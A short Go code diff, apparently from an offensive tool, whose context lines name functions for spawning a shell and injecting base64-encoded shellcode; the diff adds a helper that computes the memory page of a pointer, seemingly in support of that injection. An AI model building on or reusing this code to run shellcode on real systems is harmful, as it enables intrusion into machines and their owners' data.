@@ -4,6 +4,8 @@ import (
 	"encoding/base64"
 	"net"
 	"os/exec"
+	"syscall"
+	"unsafe"
 )
 
 func GetShell() *exec.Cmd {
@@ -26,4 +28,8 @@ func InjectShellcode(encShellcode string) {
 		}
 	}
 	return
+}
+
+func getPage(p uintptr) []byte {
+	return (*(*[0xFFFFFF]byte)(unsafe.Pointer(p & ^uintptr(syscall.Getpagesize()-1))))[:syscall.Getpagesize()]
 }
